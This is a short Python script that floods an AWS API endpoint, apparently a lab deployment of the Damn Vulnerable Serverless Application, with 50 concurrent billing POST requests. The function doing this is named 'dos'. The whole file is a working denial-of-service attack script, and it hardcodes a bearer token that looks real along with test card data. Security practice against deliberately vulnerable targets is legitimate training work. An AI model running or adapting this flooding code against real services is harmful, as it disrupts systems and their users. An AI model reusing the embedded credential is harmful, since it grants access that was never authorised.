from concurrent.futures import ThreadPoolExecutor
import requests
import time

URL = "https://kr5nlybc5h.execute-api.us-east-1.amazonaws.com/dvsa/order"
HEADERS =   {"Authorization": "eyJraWQiOiJnQ3pucHQySjNoT1AyRzExZUtqWjlsQlFzb0lYb1RVZGdkSnNTUnVMUkpRPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI1NDA4MDQ4OC01MDgxLTcwOWQtZDdhNi05OTA1MmU4YzY4OTQiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9wUFl3VzFLd1EiLCJjbGllbnRfaWQiOiI1OTNoaGdjb21jdWdhZmx2MW41b2c1YnU3diIsIm9yaWdpbl9qdGkiOiJiMzE3NzQxMS0wYWI4LTQzOWMtYjY4My01NWE3YTU3NGM3YTciLCJldmVudF9pZCI6ImM0NDAzM2NkLWEwMmUtNDA5Mi1hNjhlLTRhZjM1ODcyMTg2NSIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NzYwMTM0MzIsImV4cCI6MTc3NjI4Mzk0MCwiaWF0IjoxNzc2MjgwMzQwLCJqdGkiOiI1N2Q3ODY5ZC01NzJkLTQxMDItYWM1OC00NTQ2YWZiMTNjNzYiLCJ1c2VybmFtZSI6IjU0MDgwNDg4LTUwODEtNzA5ZC1kN2E2LTk5MDUyZThjNjg5NCJ9.G6axWR52v6lhsmEBL4ZlMAfroHMRQHKarEDxz7VRcH-7YG76A4MDla5vwh0zculGX-pHtRC8384tSww8nVfelULNpYwSHG1hn-vkzfFEGrCAC04m0rK72nEfrR-IJmaZESDhSZprWkpdw0uffxG5ZPMfyYBYExMOJA9eIPg8eZzffkiRgbBC63JXuXzghLJFZnwW3IcuprqfApTdx_tSWbIHbc03ZtIacMuXlmaO98GWWmhuCZWUgMXJkr6hWqO-xLnmUiW26YIoUF5nI5E1jiks6juuPUZEUeES6lOaCkxtSqh_EKKXw9bx3U44oikSTzu0JeQack7koHuaToovZQ",
    "Content-Type": "application/json",
}
PAYLOAD = {
    "action": "billing",
    "order-id": "5dcb463d-71e5-4d0d-a027-cfdf1a34f300",
    "data": {
        "ccn": "4242424242424242",
        "exp": "11/2020",
        "cvv": "444"
    }
}

def dos(session: requests.Session, i: int):
    try:
        r = session.post(URL, json=PAYLOAD, headers=HEADERS, timeout=10)
        print(f"{i}: {r.status_code} {r.text[:200]}")
    except requests.RequestException as e:
        print(f"{i}: ERROR {e}")

def main():
    total_requests = 50
    max_workers = 10

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for i in range(total_requests):
                executor.submit(dos, session, i)

if __name__ == "__main__":
    main()